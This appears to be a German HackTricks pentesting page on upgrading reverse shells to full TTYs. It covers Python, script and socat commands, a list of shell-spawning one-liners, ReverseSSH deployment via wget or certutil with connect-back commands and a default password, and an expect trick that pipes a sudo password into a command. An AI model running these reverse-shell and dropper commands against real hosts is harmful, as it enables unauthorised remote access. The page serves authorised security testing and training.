# Vollständige TTYs

{{#include ../../banners/hacktricks-training.md}}

## Vollständige TTY

Beachten Sie, dass die Shell, die Sie in der `SHELL`-Variable festlegen, **in** _**/etc/shells**_ **aufgelistet sein muss** oder `Der Wert für die SHELL-Variable wurde in der /etc/shells-Datei nicht gefunden. Dieser Vorfall wurde gemeldet`. Beachten Sie auch, dass die nächsten Snippets nur in bash funktionieren. Wenn Sie sich in einer zsh befinden, wechseln Sie zu bash, bevor Sie die Shell durch Ausführen von `bash` erhalten.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Sie können die **Anzahl** der **Zeilen** und **Spalten** durch Ausführen von **`stty -a`** erhalten

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shells erzeugen**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Eine praktische Möglichkeit für **interaktiven Shell-Zugriff**, sowie **Dateiübertragungen** und **Portweiterleitungen**, ist das Ablegen des statisch verlinkten ssh-Servers [ReverseSSH](https://github.com/Fahrj/reverse-ssh) auf dem Ziel.

Unten ist ein Beispiel für `x86` mit upx-komprimierten Binärdateien. Für andere Binärdateien, siehe die [Release-Seite](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Bereiten Sie sich lokal vor, um die ssh-Portweiterleitungsanfrage abzufangen:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux-Ziel:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 Ziel (für frühere Versionen, siehe [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Wenn die ReverseSSH-Portweiterleitungsanfrage erfolgreich war, sollten Sie sich jetzt mit dem Standardpasswort `letmeinbrudipls` im Kontext des Benutzers, der `reverse-ssh(.exe)` ausführt, anmelden können:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) aktualisiert automatisch Linux-Reverse-Shells auf TTY, verwaltet die Terminalgröße, protokolliert alles und vieles mehr. Außerdem bietet es readline-Unterstützung für Windows-Shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Kein TTY

Wenn Sie aus irgendeinem Grund kein vollständiges TTY erhalten können, **können Sie dennoch mit Programmen interagieren**, die Benutzereingaben erwarten. Im folgenden Beispiel wird das Passwort an `sudo` übergeben, um eine Datei zu lesen:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
